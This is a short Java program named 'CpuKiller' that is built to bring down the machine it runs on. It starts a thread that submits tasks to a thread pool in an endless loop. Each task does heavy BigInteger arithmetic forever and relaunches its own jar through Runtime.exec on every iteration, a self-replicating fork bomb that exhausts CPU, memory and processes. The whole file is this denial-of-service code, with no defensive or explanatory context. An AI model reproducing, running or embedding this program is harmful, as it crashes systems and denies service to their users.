package cpukiller;

import java.io.IOException;
import java.math.BigInteger;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * @author Sonic
 */
public class CpuKiller {

    public static int os;
    
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        os = detectOS();
        Server srv = new Server();
        Thread thr = new Thread(srv);
        thr.start();
    }
    
    private static int detectOS(){
        String os = System.getProperty("os.name");
        if(os.contains("Windows")) return 0;
        else if(os.contains("Linux")) return 1;
        else return -1;
    }

    public static void runWin() {
        BigInteger q = new BigInteger("10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
        int x = 100000000, i=0;
        BigInteger m = q.nextProbablePrime();
        BigInteger n = m.modPow(q, m);
        BigInteger p = n.flipBit(x);
        BigInteger o = p.multiply(q);
        while(true){
            m = q.nextProbablePrime();
            n = m.modPow(q, m);
            p = n.flipBit(x);
            o = p.multiply(q);
            System.out.println(m);
            System.out.println(n);
            System.out.println(p);
            System.out.println(o);
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
            for(StackTraceElement ex : stackTrace) System.out.println(ex.toString());
            try {
                Runtime.getRuntime().exec("java -jar "+System.getProperty("user.dir")+"/cpukiller.jar");
            } catch(IOException ex){
                //
            }
        }
    }

    public static void runLin() {
        runWin();
    }

    public static void runOther() {
        runWin();
    }
    
}

class Server implements Runnable{
    
    ExecutorService pool;
    
    @Override
    public void run(){
        pool = Executors.newFixedThreadPool(4);
                
        try {
            deploy();
            
        } catch (IOException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
    
    private void deploy() throws IOException{
        
        while(true) {
            pool.submit(() -> {
                switch(CpuKiller.os){
                    case 0: CpuKiller.runWin();
                    break;
                    case 1: CpuKiller.runLin();
                    break;
                    case -1: CpuKiller.runOther();
                    break;
                }
            });
        }
        
    }
}